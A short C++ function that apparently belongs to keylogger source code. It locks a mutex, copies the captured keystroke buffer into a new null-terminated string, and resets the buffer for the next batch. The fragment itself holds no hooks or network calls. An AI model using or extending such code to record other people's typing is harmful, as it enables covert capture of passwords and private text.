char* FlushKeylogBuffer(int* length) {
    std::lock_guard<std::mutex> guard(m);
    char* newBuffer = (char*)malloc(i + 1); // +1 for null termination
    if (newBuffer == nullptr) {
        *length = 0;
        return nullptr;
    }
    memcpy(newBuffer, KeylogBuffer, i);
    newBuffer[i] = '\0'; // null termination
    *length = i;
    i = 0; // reset the index
    return newBuffer;
}
